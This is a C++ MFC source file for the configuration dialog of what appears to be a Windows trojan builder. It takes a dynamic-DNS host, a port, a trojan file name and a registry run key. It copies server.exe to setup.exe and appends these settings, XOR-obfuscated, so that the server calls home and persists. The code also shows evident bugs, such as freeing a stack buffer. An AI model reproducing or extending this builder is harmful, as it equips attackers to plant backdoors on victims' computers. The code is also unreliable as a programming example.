// ConfigBDlg.cpp : implementation file
//

#include "stdafx.h"
#include "ConfigB.h"
#include "ConfigBDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CConfigBDlg dialog

CConfigBDlg::CConfigBDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CConfigBDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CConfigBDlg)
	m_regrun = FALSE;
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CConfigBDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CConfigBDlg)
	DDX_Control(pDX, IDC_TROJANEXE, m_exetrojan);
	DDX_Control(pDX, IDC_REGMACH, m_regmach);
	DDX_Control(pDX, IDC_REGKEY, m_regkey);
	DDX_Check(pDX, IDC_REGMACH, m_regrun);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CConfigBDlg, CDialog)
	//{{AFX_MSG_MAP(CConfigBDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_CONFIG, OnConfig)
	ON_BN_CLICKED(IDC_REGMACH, OnRegEnable)
	ON_BN_CLICKED(IDC_CANCEL, OnCancel)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CConfigBDlg message handlers

BOOL CConfigBDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CConfigBDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CConfigBDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CConfigBDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CConfigBDlg::OnConfig() 
{
	// TODO: Add your control notification handler code here
	CString m_dyndns;
	CString m_timedelay;
	CString m_trojanexe;
	CString m_regset;
	CString configstr;

	GetDlgItemText(IDC_DYNDNS,m_dyndns);
	GetDlgItemText(IDC_TIMEDELAY,m_timedelay);


	if(m_dyndns.IsEmpty())
	{
		AfxMessageBox("动态域名不能为空");
		return;
	}
	else if(m_timedelay.IsEmpty())
	{
		AfxMessageBox("端口不能为空");
		return;
	}

	CopyFile("server.exe","setup.exe",false);
	FILE *fp = fopen("setup.exe", "rb+");

	GetDlgItemText(IDC_REGKEY,m_regset);
	GetDlgItemText(IDC_TROJANEXE,m_trojanexe);
	
	configstr = m_dyndns + "$" + m_timedelay + "$" + m_trojanexe + "$" + "" + "$";

	if(m_regset != "")
		configstr = configstr + m_regset + "$";
	else
		configstr = configstr + "null$";
	
	if(fp == NULL)
	{
		MessageBox("I can't find server.exe");
		return;
	}

	char *str = "configserver";
	char *mac = new char [256];
	char svBuffer[512];

	mac = configstr.GetBuffer(configstr.GetLength());
	jiami(mac,configstr.GetLength());
	memset(svBuffer,0,512);
		fseek(fp, 0, SEEK_END);
		strcpy(svBuffer,"configserver");
		fwrite(svBuffer, sizeof(char), 12, fp);
		fwrite(mac, sizeof(char), configstr.GetLength(), fp);
		memset(svBuffer,65,512);
		fwrite(svBuffer, sizeof(char), 500-configstr.GetLength(), fp);
		fseek(fp, 0, SEEK_END);
	fclose(fp);
	free(svBuffer);
	MessageBox("Config Complete");
}

void CConfigBDlg::jiami(char *a,int len)
{
	int i;
	for(i=0;i<len;i++)
		a[i]=a[i]^1116;
}


void CConfigBDlg::OnRegEnable() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	m_regkey.EnableWindow( m_regrun );
	m_exetrojan.EnableWindow ( m_regrun );

}



void CConfigBDlg::OnCancel() 
{
	// TODO: Add your control notification handler code here
	CDialog::OnOK();
}
